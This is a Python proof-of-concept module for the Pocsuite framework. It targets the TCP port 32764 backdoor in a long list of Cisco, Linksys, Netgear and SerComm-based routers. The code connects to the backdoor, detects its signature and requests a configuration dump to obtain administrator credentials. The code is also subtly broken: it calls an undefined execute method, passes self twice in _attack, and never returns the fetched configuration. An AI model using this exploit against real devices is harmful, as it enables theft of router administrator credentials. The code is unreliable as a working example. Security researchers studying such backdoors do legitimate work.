#!/usr/bin/python
# -*- coding: utf-8 -*-

from pocsuite.api.request import req
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.poc import register
from pocsuite.api.utils import url2ip
import struct
import socket
import re
import string
import random

class TestPOC(POCBase):
    name = "TCP-32764 Info Disclosure"
    vulID = ''
    author = ['sebao']
    vulType = 'Info Disclosure'
    version = '1.0'  # default version: 1.0
    references = 'https://github.com/elvanderb/TCP-32764'
    desc = 'Exploits backdoor functionality that allows fetching credentials for administrator user.'


    vulDate = ''
    createDate = '2017-10-18'
    updateDate = '2017-10-18'

    appName = ' Cisco RVS4000 fwv 2.0.3.2 & 1.3.0.5,Cisco WAP4410N,Cisco WRVS4400N,Cisco WRVS4400N,Diamond DSL642WLG / SerComm IP806Gx v2 TI,LevelOne WBR3460B,Linksys RVS4000 Firmware V1.3.3.5,Linksys WAG120N,Linksys WAG160n v1 and v2,Linksys WAG200G,Linksys WAG320N,Linksys WAG54G2,Linksys WAG54GS,Linksys WRT350N v2 fw 2.00.19,Linksys WRT300N fw 2.00.17,Netgear DG834,Netgear DGN1000,Netgear DGN2000B,Netgear DGN3500,Netgear DGND3300,Netgear DGND3300Bv2 fwv 2.1.00.53_1.00.53GR,Netgear DM111Pv2,Netgear JNR3210'
    appVersion = ''
    dork = ''
    appPowerLink = ''
    samples = []

    def _attack(self):

        return self._verify(self)

    def _verify(self):
        '''verify mode'''
        result = {}
        url = url2ip(self.url)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(30)
        s.connect((url, 32764))
        a = ''.join(random.sample(string.ascii_letters, 6))
        s.send(a)
        r = s.recv(0xC)
        while len(r) < 0xC:
            tmp = s.recv(0xC - len(r))
            r += tmp

        sig, ret_val, ret_len = struct.unpack('<III', r)

        if sig == 0x53634D4D:
            endianness = "<"
        elif sig == 0x4D4D6353:
            endianness = ">"
        s.close()

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((url, 32764))

        conf = self.execute(s, 1)
        s.close()

        lines = re.split("\x00|\x01", conf)

        if len(lines):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)
